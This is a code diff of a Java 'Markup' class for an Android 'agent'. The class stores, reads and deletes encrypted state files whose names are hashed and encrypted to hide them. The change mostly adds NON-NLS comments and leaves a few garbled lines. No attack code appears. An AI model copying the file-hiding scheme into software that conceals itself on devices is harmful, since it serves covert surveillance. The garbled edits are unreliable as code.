@@ -34,12 +34,12 @@ import com.android.service.util.Utils;
  */
 public class Markup {
 
-	private static final String TAG = "Markup";
-
-	public static final String MARKUP_EXTENSION = ".qmm";
+	private static final String TAG = "Markup"; //$NON-NLS-1$
+ //$NON-NLS-1$
+	public static final String MARKUP_EXTENSION = ".qmm"; //$NON-NLS-1$
 	public static byte markupSeed;
 	public static boolean markupInit;
-	private String agentId = "core";
+	private String agentId = "core"; //$NON-NLS-1$
 
 	private String lognName;
 	private AutoFile file;
@@ -88,13 +88,13 @@ public class Markup {
 		// final String markupName = Integer.toHexString(agentId);
 		final String markupName = Utils.byteArrayToHex(Encryption.SHA1(agentId.getBytes()));
 		if (Cfg.DEBUG) {
-			Check.requires(markupName != null, "null markupName");
+			Check.requires(markupName != null, "null markupName"); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.requires(markupName != "", "empty markupName");
+			Check.requires(markupName != "", "empty markupName"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		String encName = "";
+		String encName = ""; //$NON-NLS-1$
 
 		if (addPath) {
 			encName = Path.markup();
@@ -103,7 +103,7 @@ public class Markup {
 		encName += Encryption.encryptName(markupName + MARKUP_EXTENSION, getMarkupSeed());
 
 		if (Cfg.DEBUG) {
-			Check.asserts(markupInit, "makeMarkupName: " + markupInit);
+			Check.asserts(markupInit, "makeMarkupName: " + markupInit); //$NON-NLS-1$
 		}
 		return encName;
 	}
@@ -132,7 +132,7 @@ public class Markup {
 		final String markupName = makeMarkupName(value, true);
 
 		if (Cfg.DEBUG) {
-			Check.asserts(markupName != "", "markupName empty");
+			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		final AutoFile file = new AutoFile(markupName);
@@ -162,7 +162,7 @@ public class Markup {
 				numDeleted++;
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error (removeMarkups): " + type);
+					Check.log(TAG + " Error (removeMarkups): " + type) ;//$NON-NLS-1$
 				}
 			}
 		}
@@ -172,7 +172,7 @@ public class Markup {
 				numDeleted++;
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error (removeMarkups): " + type);
+					Check.log(TAG + " Error (removeMarkups): " + type) ;//$NON-NLS-1$
 				}
 			}
 		}
@@ -181,17 +181,17 @@ public class Markup {
 	}
 
 	/**
-	 * Checks if is markup.
+	 * Check. if is markup. //$NON-NLS-1$
 	 * 
 	 * @return true, if is markup
 	 */
 	public synchronized boolean isMarkup() {
 		if (Cfg.DEBUG) {
-			Check.requires(agentId != null, "agentId null");
+			Check.requires(agentId != null, "agentId null"); //$NON-NLS-1$
 		}
 		final String markupName = makeMarkupName(agentId, true);
 		if (Cfg.DEBUG) {
-			Check.asserts(markupName != "", "markupName empty");
+			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		final AutoFile fileRet = new AutoFile(markupName);
@@ -212,12 +212,12 @@ public class Markup {
 	 */
 	public synchronized byte[] readMarkup() throws IOException {
 		if (Cfg.DEBUG) {
-			Check.requires(agentId != null, "agentId null");
+			Check.requires(agentId != null, "agentId null"); //$NON-NLS-1$
 		}
 
 		final String markupName = makeMarkupName(agentId, true);
 		if (Cfg.DEBUG) {
-			Check.asserts(markupName != "", "markupName empty");
+			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		final AutoFile fileRet = new AutoFile(markupName);
@@ -234,16 +234,16 @@ public class Markup {
 			}
 
 			if (Cfg.DEBUG) {
-				Check.asserts(plain != null, "wrong decryption: null");
+				Check.asserts(plain != null, "wrong decryption: null"); //$NON-NLS-1$
 			}
 			if (Cfg.DEBUG) {
-				Check.asserts(plain.length == len, "wrong decryption: len");
+				Check.asserts(plain.length == len, "wrong decryption: len"); //$NON-NLS-1$
 			}
 
 			return plain;
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (readMarkup): Markup file does not exists");
+				Check.log(TAG + " Error (readMarkup): Markup file does not exists") ;//$NON-NLS-1$
 			}
 			return null;
 		}
@@ -254,12 +254,12 @@ public class Markup {
 	 */
 	public synchronized void removeMarkup() {
 		if (Cfg.DEBUG) {
-			Check.requires(agentId != null, "agentId null");
+			Check.requires(agentId != null, "agentId null"); //$NON-NLS-1$
 		}
 
 		final String markupName = makeMarkupName(agentId, true);
 		if (Cfg.DEBUG) {
-			Check.asserts(markupName != "", "markupName empty");
+			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		final AutoFile remove = new AutoFile(markupName);
@@ -282,7 +282,7 @@ public class Markup {
 		final String markupName = makeMarkupName(agentId, true);
 
 		if (Cfg.DEBUG) {
-			Check.asserts(markupName != "", "markupName empty");
+			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 		if (!Path.haveStorage()) {
 			return false;
@@ -297,7 +297,7 @@ public class Markup {
 			final byte[] encData = encryption.encryptData(data);
 
 			if (Cfg.DEBUG) {
-				Check.asserts(encData.length >= data.length, "strange data len");
+				Check.asserts(encData.length >= data.length, "strange data len"); //$NON-NLS-1$
 			}
 
 			fileRet.write(data.length);
@@ -326,7 +326,7 @@ public class Markup {
 			return o;
 		} catch (final ClassNotFoundException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (readMarkupSerializable): " + e);
+				Check.log(TAG + " Error (readMarkupSerializable): " + e) ;//$NON-NLS-1$
 			}
 			throw new IOException();
 		}
